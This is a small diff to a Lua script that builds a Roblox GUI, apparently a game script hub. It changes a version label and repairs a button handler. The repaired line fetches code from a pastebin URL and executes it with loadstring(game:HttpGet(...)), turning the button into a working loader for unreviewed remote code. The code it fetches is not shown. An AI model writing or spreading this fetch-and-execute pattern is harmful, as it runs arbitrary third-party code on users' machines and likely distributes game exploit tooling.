@@ -118,7 +118,7 @@ TextLabel_2.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
 TextLabel_2.Position = UDim2.new(0.626112759, 0, -0.284090906, 0)
 TextLabel_2.Size = UDim2.new(0, 130, 0, 50)
 TextLabel_2.Font = Enum.Font.SourceSans
-TextLabel_2.Text = "v1.2a"
+TextLabel_2.Text = "v1.3a"
 TextLabel_2.TextColor3 = Color3.fromRGB(238, 238, 238)
 TextLabel_2.TextScaled = true
 TextLabel_2.TextSize = 14.000
@@ -203,7 +203,7 @@ local function LXLBV_fake_script() -- door.LocalScript
 	local script = Instance.new('LocalScript', door)
 
 	script.Parent.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet("loadstring(game:HttpGet('https://pastebin.com/raw/UXtgRLin"))()
+		loadstring(game:HttpGet("https://pastebin.com/raw/UXtgRLin"))()
 	end)
 end
 coroutine.wrap(LXLBV_fake_script)()
